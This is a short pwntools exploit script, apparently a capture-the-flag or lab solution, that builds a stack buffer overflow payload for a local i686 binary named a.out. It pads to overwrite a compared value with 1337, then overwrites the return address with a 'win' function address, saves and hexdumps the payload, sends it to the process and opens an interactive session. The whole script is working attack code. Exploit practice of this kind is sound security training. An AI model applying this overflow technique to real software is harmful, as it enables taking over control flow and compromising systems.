#!/usr/bin/env python3
import pwn

# Target: i686

OFFSET_CMP = 10
OFFSET_RET = 62
CMP_VALUE = 1337
WIN_ADDR = 0x8049242

buf = b'A' * OFFSET_CMP
buf += pwn.p32(CMP_VALUE)
buf = buf.ljust(OFFSET_RET, b'B')
buf += pwn.p32(WIN_ADDR)

with open("payload.bin", "wb") as fp:
    fp.write(buf)

pwn.log.info("Payload")
print(pwn.hexdump(buf, width=16))

r = pwn.process("./a.out")
r.writeline(buf)
r.interactive()
